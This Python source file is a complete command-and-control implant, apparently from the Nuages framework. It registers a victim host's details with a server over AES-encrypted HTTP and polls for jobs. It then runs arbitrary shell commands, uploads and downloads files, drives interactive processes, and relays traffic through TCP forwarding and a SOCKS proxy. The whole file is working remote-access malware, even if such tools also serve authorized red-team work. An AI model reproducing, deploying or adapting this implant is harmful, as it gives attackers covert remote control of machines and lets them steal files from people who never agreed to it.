import hashlib
import requests
import platform
import subprocess
from Crypto import Random
from Crypto.Cipher import AES
import binascii
import json
import io
import base64
import argparse
import os
import socket
import sys
import time
import sys
from subprocess import PIPE, Popen
from threading  import Thread
import time
from queue import Queue, Empty

def enqueue_output(proc, queue):
    while(proc.poll() == None):
        queue.put(proc.stdout.read(1))

class PKCS7Encoder(object):
    def __init__(self, k=16):
       self.k = k

    ## @param text The padded text for which the padding is to be removed.
    # @exception ValueError Raised when the input padding is missing or corrupt.
    def decode(self, bytestring):
        '''
        Remove the PKCS#7 padding from a text string
        '''
        val = bytestring[-1]
        if val > self.k:
            raise ValueError('Input is not padded or padding is corrupt')
        l = len(bytestring) - val
        return bytestring[:l]

    ## @param text The text to encode.
    def encode(self, bytestring):
        """
        Pad an input bytestring according to PKCS#7
        """
        l = len(bytestring)
        val = self.k - (l % self.k)
        return bytestring + bytearray([val] * val)

class AESCipher(object):

    def __init__(self, key): 
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()
        self.pkcs7 = PKCS7Encoder()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        #return base64.b64encode(iv + cipher.encrypt(raw))
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        #enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:]))

    def _pad(self, s):
        return self.pkcs7.encode(s)

    def _unpad(self, s):
        return self.pkcs7.decode(s)

class NuagesConnector:
    def __init__(self, connectionString, key):
        # The URL of our handler
        self.connectionString = connectionString
        # The seed to generate our encryption keys
        self.aes = AESCipher(key)

    def POST(self, url, data):
        encrypted_data = self.aes.encrypt(bytes(data, 'utf-8'))

        # The target URL is sent as Base64 in the Authorization header
        encrypted_url = base64.b64encode(self.aes.encrypt(bytes(url, 'utf-8')))
        headers = {'Authorization': encrypted_url}

        r = requests.post(self.connectionString, encrypted_data, headers=headers)
        if(r.status_code != 200):
            raise Exception(r.status_code)            
        if(len(r.content)>0):
            # The result must be decrypted
            return self.aes.decrypt(r.content).decode('utf-8')
        return ''

    def POSTBIN(self, pipe_id, data):
        # The target URL is generated
        url = "io/" + pipe_id
        
        # The data is encrypted
        encrypted_data = self.aes.encrypt(data)

        # The target URL is sent as Base64 in the Authorization header
        encrypted_url = base64.b64encode(self.aes.encrypt(bytes(url, 'utf-8')))
        
        headers = {'Authorization': encrypted_url}

        r = requests.post(self.connectionString, encrypted_data, headers=headers)
        if(r.status_code != 200):
            raise Exception(r.status_code)            
        if(len(r.content)>0):
            # The result must be decrypted
            return self.aes.decrypt(r.content)
        return ''

    def POSTBIN(self, pipe_id, data, maxSize):
        # The target URL is generated
        url = "io/{}/{}".format(pipe_id, maxSize)
        
        # The data is encrypted
        encrypted_data = self.aes.encrypt(data)

        # The target URL is sent as Base64 in the Authorization header
        encrypted_url = base64.b64encode(self.aes.encrypt(bytes(url, 'utf-8')))
        
        headers = {'Authorization': encrypted_url}

        r = requests.post(self.connectionString, encrypted_data, headers=headers)
        if(r.status_code != 200):
            raise Exception(r.status_code)            
        if(len(r.content)>0):
            # The result must be decrypted
            return self.aes.decrypt(r.content)
        return ''


class NuagesImplant:
    def __init__(self, nuages, config):
        # This is the connector object the implant will use to communicate with the API
        self.nuages = nuages

        # A configuration dictionary
        self.config = config

        # The implant gathers all the information about itself when it is created
        self.os = platform.system()
        if self.os == "Windows":
            self.username = os.getenv("username")
        else:
            self.username = os.getenv("LOGNAME")
        self.hostname = socket.gethostname()
        self.ip = socket.gethostbyname(self.hostname)
        self.handler = "HTTPAES256"
        self.implantType = "Python"
        self.connectionString = self.nuages.connectionString
        self.supportedPayloads = ["cd", "command", "configure", "upload", "download", "interactive", "tcp_fwd", "socks", "exit"]
        self.config = config

    def register(self):
        # The implant information is put into Json
        data = json.dumps({'os': self.os,\
             'hostname': self.hostname,\
             'localIp': self.ip,\
             'username': self.username,\
             'handler': self.handler,\
             'implantType': self.implantType,\
             'connectionString': self.connectionString,\
             'supportedPayloads': self.supportedPayloads  
                   })
        self.id = ""
        # We use the connector to obtain an id from the server
        while self.id == "":
            response = self.nuages.POST("register", data)
            self.id = json.loads(response)["_id"]
            time.sleep(5)
    
    def heartbeat(self):
        # The implant send it's ID and receives a list of jobs as a response
        data = json.dumps({'id': self.id})
        response = self.nuages.POST("heartbeat", data)
        return json.loads(response)["data"]
    
    def pipe2stream(self, pipe_id, stream, bytesWanted):
        bytesRead = 0
        # The implant configuration is used
        buffersize = int(self.config["buffersize"])
        refreshrate = float(self.config["refreshrate"]) / 1000
        # Until the whole file has been loaded from the pipe
        while (bytesRead < bytesWanted):
            # We dont want to read more from the pipe than the size of our buffer
            response = self.nuages.POSTBIN(pipe_id, b'', min(buffersize, bytesWanted - bytesRead))
            if(len(response)>0):
                bytesRead += len(response)
                # We can write the bytes to the stream
                stream.write(response)
                time.sleep(refreshrate)

    def stream2pipe(self, pipe_id, stream):
        # The implant configuration is used
        buffersize = int(self.config["buffersize"])
        refreshrate = float(self.config["refreshrate"]) / 1000
        buffer = [1]
        # While we can buffer bytes fromt the file stream
        while (len(buffer) > 0):
            buffer = stream.read(buffersize)
            self.nuages.POSTBIN(pipe_id, buffer, 0)
            time.sleep(refreshrate)
    
    def pipe_read(self, pipe_id):
        buffersize = int(self.config["buffersize"])
        response = self.nuages.POSTBIN(pipe_id, b'', buffersize)
        if(len(response)>0):
                return response
        else:
            return b''

    def pipe_readbytes(self, pipe_id, bytesWanted):
        buffersize = int(self.config["buffersize"])
        refreshrate = float(self.config["refreshrate"]) / 1000
        body = {}
        body["pipe_id"] = pipe_id
        buffer = b''
        # We read from the pipe until we have read the amount we want
        while (len(buffer) < bytesWanted):
            # We dont want to read more than needed
            maxSize = min(buffersize, bytesWanted - len(buffer))
            response = self.nuages.POSTBIN(pipe_id, b'', maxSize)
            if(len(response)>0):
                # We append the read data to our buffer
                buffer += response
                time.sleep(refreshrate)
        # We return the buffer
        return buffer

    def pipe_readwrite(self, pipe_id, data):
        buffersize = int(self.config["buffersize"])
        refreshrate = float(self.config["refreshrate"]) / 1000
        buffer = b''
        sentBytes = 0
        l = len(data)
        # Until we have sent all the data we need to send
        while (sentBytes < l):
            # We cant send more than our buffer
            bytesToSend = min(buffersize, l - sentBytes)
            # The data is sent as base64
            dataToSend = data[sentBytes:sentBytes + bytesToSend]
            sentBytes += bytesToSend
            response = self.nuages.POSTBIN(pipe_id, dataToSend, buffersize)
            if(len(response)>0):
                # If there is data in the stream it is appended to our buffer
                buffer += response
            time.sleep(refreshrate)
        # We return any data that we read
        return buffer

    def pipe_write(self, pipe_id, data):
        buffersize = int(self.config["buffersize"])
        refreshrate = float(self.config["refreshrate"]) / 1000
        sentBytes = 0
        l = len(data)
        # Until we have sent all the data we need to send
        while (sentBytes < l):
            # We cant send more than our buffer
            bytesToSend = min(buffersize, l - sentBytes)
            # The data is sent as base64
            dataToSend = data[sentBytes:sentBytes + bytesToSend]
            sentBytes += bytesToSend
            self.nuages.POSTBIN(pipe_id, dataToSend, 0)
            time.sleep(refreshrate)

    def jobResult(self, job_id, result, error):
        # The implant wont send more than this amount of data per request
        buffersize = int(self.config["buffersize"])
        i = 0
        l = len(result)
        # If the result is empty a single request is needed
        if(l == 0):
            data = json.dumps({'moreData': False,\
                'jobId': job_id,\
                'result': "",\
                'error': error})
            self.nuages.POST("jobResult", data)
            return
        # Let's chunk the result into pieces and submit them to the server
        while(i < l):
            if(i + buffersize >= l):
                data = json.dumps({'moreData': False,\
                'jobId': job_id,\
                'result': result[i:],\
                'error': error})
            else:
                data = json.dumps({'moreData': True,\
                'jobId': job_id,\
                'result': result[i:i+buffersize],\
                'error': error})
            i += buffersize
            self.nuages.POST("jobResult", data)
    
    def do_command(self, job):
        # If a path is provided we execute the job in that path
        if ("path" in job["payload"]["options"]):
            os.chdir(job["payload"]["options"]["path"])
        # The command is executed
        child = subprocess.Popen(job["payload"]["options"]["cmd"], shell = True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        result = child.communicate()[0]
        error = (child.returncode != 0)
        # The result is returned to the server
        self.jobResult(job["_id"], result.decode("utf-8"), error)

    def do_download(self, job):
        # If a path is provided we execute the job in that path
        if ("path" in job["payload"]["options"]):
            os.chdir(job["payload"]["options"]["path"])
        # The file argument could be a directory, in which case we will 
        # use the default file name and write the file to that directory
        if os.path.isdir(job["payload"]["options"]["file"]):
            os.chdir(job["payload"]["options"]["file"])
            target = job["payload"]["options"]["filename"]
        else:
            target = job["payload"]["options"]["file"]
        # We open the file stream
        with open(target, "wb") as fs:
            # We use pipe2stream to pipe the Nuages pipe into the filestream
            self.pipe2stream(job["payload"]["options"]["pipe_id"], fs, job["payload"]["options"]["length"])    
            self.jobResult(job["_id"], fs.name, False)
        
    def do_upload(self, job):
        # If a path is provided we execute the job in that path
        if ("path" in job["payload"]["options"]):
            os.chdir(job["payload"]["options"]["path"])
        if os.path.isdir(job["payload"]["options"]["file"]):
            raise "This is a directory"
        # We open the file stream
        with open(job["payload"]["options"]["file"], "rb") as fs:
            # We use stream2pipe to pipe the filestream into the Nuages pipe
            self.stream2pipe(job["payload"]["options"]["pipe_id"], fs)    
            self.jobResult(job["_id"], fs.name, False)

    def do_interactive(self, job):
        refreshrate = float(self.config["refreshrate"]) / 1000
        # If a path is provided we execute the job in that path
        if ("path" in job["payload"]["options"]):
            os.chdir(job["payload"]["options"]["path"])
        command = [job["payload"]["options"]["filename"]]
        if ("args" in job["payload"]["options"]):
            args = job["payload"]["options"]["args"]
            if(args!=""):
                command.extend(args.split(" "))
        # We create a process object and pipe it's output
        proc = subprocess.Popen(command,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT)
        pipe_id = job["payload"]["options"]["pipe_id"]
        # We create a queue to communicate with enqueuing thread
        queue = Queue()
        # We create a thread that reads from the process and put the bytes in the queues
        # This is necessary as python blocks on process.stdout.read() operations
        t = Thread(target=enqueue_output, args=(proc, queue))
        t.daemon = True
        t.start()
        line = b""
        try:
            # While the process is still running
            while(proc.poll() == None):
                # If there are bytes in the queue, they come from stdout
                try:  line += queue.get_nowait()
                except Empty:
                    if(len(line) == 0):
                        # If stdout was empty, we just need to read from the pipe
                        inbuffer = self.pipe_read(pipe_id)
                    else:
                        # If not, we write the bytes to the pipe
                        inbuffer = self.pipe_readwrite(pipe_id,line)
                    # If we received data from the pipe, we feed it into stdin
                    if(len(inbuffer) > 0):
                        proc.stdin.write(inbuffer)
                        proc.stdin.flush()
                    time.sleep(refreshrate)
                    line = b""
        except Exception as e:
            del queue
            raise e
        del queue
        self.jobResult(job["_id"], "Process Exited!", False)

    def do_configure(self, job):
        # If the config must be changed
        if ("config" in job["payload"]["options"]):
            config = job["payload"]["options"]["config"]
            # We change all the keys that are defined in the job
            for key in config:
                self.config[key] = config[key]
        # We return the configuration to the client at text
        self.jobResult(job["_id"], json.dumps(self.config), False)

    def do_tcp_fwd(self, job):
        host = job["payload"]["options"]["host"]
        port = int(job["payload"]["options"]["port"])
        pipe_id = job["payload"]["options"]["pipe_id"]
        refreshrate = float(self.config["refreshrate"]) / 1000
        buffersize = int(self.config["buffersize"])
        # We open a client TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        # We set a very short timeout on the socket to prevent hanging as
        # we dont know the amount of data we are reading from the socket
        s.settimeout(refreshrate)
        try:
            while True:
                outbuff = ""
                try:
                    # We try to read from the socket
                    outbuff = s.recv(buffersize)
                # This timeout is normal
                except socket.timeout:
                    if(len(outbuff) == 0):
                        # If the buffer is empty, we just need to read from the pipe
                        inbuff = self.pipe_read(pipe_id)
                    else:
                        # If not, we send it to the pipe and receive data from the client       
                        inbuff = self.pipe_readwrite(pipe_id, outbuff)
                        time.sleep(refreshrate)
                    # We write what we received from the pipe to the socket
                    s.sendall(inbuff)
                    pass
                else:
                    # If the socket did not timeout but returned "", it has been closed
                    if(len(outbuff) == 0):
                        self.jobResult(job["_id"], "Server closed connection", False)
                        return
                    # If we read an entire buffer before timeout (seems very unlikely)
                    else:       
                        inbuff = self.pipe_readwrite(pipe_id, outbuff)
                        time.sleep(refreshrate)
                        s.sendall(inbuff)
        except Exception as e:
                # If the pipe has been deleted
            if(str(e) == "404"):
                self.jobResult(job["_id"], "Client closed connection", False)
                return
            else:
                raise(e)
            
    def do_socks(self, job):
        refreshrate = float(self.config["refreshrate"]) / 1000
        buffersize = int(self.config["buffersize"])
        pipe_id = job["payload"]["options"]["pipe_id"]
        # We read two bytes from the client
        rBuffer = self.pipe_readbytes(pipe_id, 2)
        # If it is a socks 5 connection
        if(rBuffer[0] == 5):
            rBuffer = self.pipe_readbytes(pipe_id, rBuffer[1])
            foundAuth = False
            # We only support auth 0: no auth
            for byte in rBuffer:
                if(byte == 0):
                    foundAuth = True
                    break
            if(not(foundAuth)):
                self.pipe_write(pipe_id, bytes([5, 255]))
                raise Exception("Not auth method found")
            self.pipe_write(pipe_id, bytes([5, 0]))
            rBuffer = self.pipe_readbytes(pipe_id, 4)
            # We only support the connect method
            if(rBuffer[1] != 1):
                self.pipe_write(pipe_id, bytes([5, 7]))
                raise Exception("Not a connect")
            addressType = rBuffer[3]
            # This address type is an IP address as bytes
            if(addressType == 1):
                # We read the IP address
                ipv4 = self.pipe_readbytes(pipe_id, 4)
                host = str(ipv4[0]) + "." + str(ipv4[1]) + "." + str(ipv4[2]) + "." + str(ipv4[3])
                # We read the port
                buffPort = self.pipe_readbytes(pipe_id, 2)
                port = buffPort[0] * 256 + buffPort[1]
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    # We establish the connection
                    s.connect((host, port))
                except Exception as e:
                    self.pipe_write(pipe_id, bytes([5, 7]))
                    raise(e)
                # We complete the handshake
                wBuffer = bytes([5,0,0,addressType]) + ipv4 + buffPort
                self.pipe_write(pipe_id, wBuffer)
            # This address type is a hostname
            elif (addressType == 3):
                # We read the length of the hostname
                rBuffer = self.pipe_readbytes(pipe_id, 1)
                # We read the hostname
                buffHost = self.pipe_readbytes(pipe_id, rBuffer[0])
                # We read the port
                buffPort = self.pipe_readbytes(pipe_id, 2)
                port = buffPort[0] * 256 + buffPort[1]
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    # We connect to the host
                    s.connect((buffHost.decode("ascii"), port))
                except Exception as e:
                    self.pipe_write(pipe_id, bytes([5, 7]))
                    raise(e)
                 # We complete the handshake
                wBuffer = bytes([5,0,0,addressType,rBuffer[0]]) + buffHost + buffPort
                self.pipe_write(pipe_id, wBuffer)
            else:
                self.pipe_write(pipe_id, bytes([5, 4]))
                raise Exception("Invalid destination address")
        # If it is a socks 4 connection
        elif(rBuffer[0] == 4):
            # We ensure that we can understand the command type
            if(rBuffer[1] != 1):
                # If not we respond to the client
                self.pipe_write(pipe_id, bytes([0, 91]))
                raise Exception("Invalid socks 4 command")
            # We read the port number from the client 
            buffPort = self.pipe_readbytes(pipe_id, 2)
            port = buffPort[0] * 256 + buffPort[1]
            # We read the IP address from the client 
            ipv4 = self.pipe_readbytes(pipe_id, 4)
            host = str(ipv4[0]) + "." + str(ipv4[1]) + "." + str(ipv4[2]) + "." + str(ipv4[3])
            # We read these useless bytes from the client
            while(rBuffer[0] != 0):
                rBuffer = self.pipe_readbytes(pipe_id, 1)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                # We establish the connection
                s.connect((host, port))
            except Exception as e:
                # We complete the handshake
                wBuffer = bytes([0, 91]) + ipv4 + buffPort
                self.pipe_write(pipe_id, wBuffer)
                raise(e)
            # We complete the handshake
            wBuffer = bytes([0, 90]) + ipv4 + buffPort
            self.pipe_write(pipe_id, wBuffer)
        # We set a very short timeout on the socket to prevent hanging as
        # we dont know the amount of data we are reading from the socket
        s.settimeout(refreshrate)
        try:
            while True:
                outbuff = ""
                try:
                    # We try to read from the socket
                    outbuff = s.recv(buffersize)
                # This timeout is normal
                except socket.timeout:
                    if(len(outbuff) == 0):
                        # If the buffer is empty, we just need to read from the pipe
                        inbuff = self.pipe_read(pipe_id)
                    else:
                        # If not, we send it to the pipe and receive data from the client       
                        inbuff = self.pipe_readwrite(pipe_id, outbuff)
                        time.sleep(refreshrate)
                    # We write what we received from the pipe to the socket
                    s.sendall(inbuff)
                    pass
                else:
                    # If the socket did not timeout but returned "", it has been closed
                    if(len(outbuff) == 0):
                        self.jobResult(job["_id"], "Server closed connection", False)
                        return
                    # If we read an entire buffer before timeout (seems very unlikely)
                    else:       
                        inbuff = self.pipe_readwrite(pipe_id, outbuff)
                        time.sleep(refreshrate)
                        s.sendall(inbuff)
        except Exception as e:
                # If the pipe has been deleted
            if(str(e) == "404"):
                self.jobResult(job["_id"], "Client closed connection", False)
                return
            else:
                raise(e)
            
    def do_cd(self, job):
        # The path to execute the CD command from (dir my be a relative path)
        if ("path" in job["payload"]["options"]):
            os.chdir(job["payload"]["options"]["path"])
        # The path to CD into
        if ("dir" in job["payload"]["options"]):
            os.chdir(job["payload"]["options"]["dir"])
        # The new directory is returned to the server
        self.jobResult(job["_id"], os.getcwd(), False)

    def do_exit(self, job):
        # The implant exits with a message
        self.jobResult(job["_id"], "Bye!", False)
        os._exit(0)
    
    def executeJob(self, job):
        try:
            if (job["payload"]["type"] == "command"):
                self.do_command(job)
            elif (job["payload"]["type"] == "cd"):
                self.do_cd(job)
            elif (job["payload"]["type"] == "exit"):
                self.do_exit(job)
            elif (job["payload"]["type"] == "configure"):
                self.do_configure(job)
            elif (job["payload"]["type"] == "download"):
                self.do_download(job)
            elif (job["payload"]["type"] == "upload"):
                self.do_upload(job)
            elif (job["payload"]["type"] == "interactive"):
                self.do_interactive(job)
            elif (job["payload"]["type"] == "tcp_fwd"):
                self.do_tcp_fwd(job)
            elif (job["payload"]["type"] == "socks"):
                self.do_socks(job)
        except Exception as e:
            # If the job fails, we inform the server
            self.jobResult(job["_id"], str(e), True)
            raise e

    def start(self):
        # Registering the implant
        self.register()
        while True:
            try:
                # Obtaining jobs
                jobs = self.heartbeat()
                for job in jobs:
                    t = Thread(target=self.executeJob, args=([job]))
                    t.daemon = True
                    t.start()
                time.sleep(int(config["sleep"]))
            except Exception as e:
                if(str(e) == "404"):
                    self.register()
                    pass
                else:
                    pass
                
nuages = NuagesConnector("http://127.0.0.1:8888","password")
config = {}
config["sleep"] = "1"
config["buffersize"] = "65536"
config["refreshrate"] = "50"
implant = NuagesImplant(nuages, config)
implant.start()
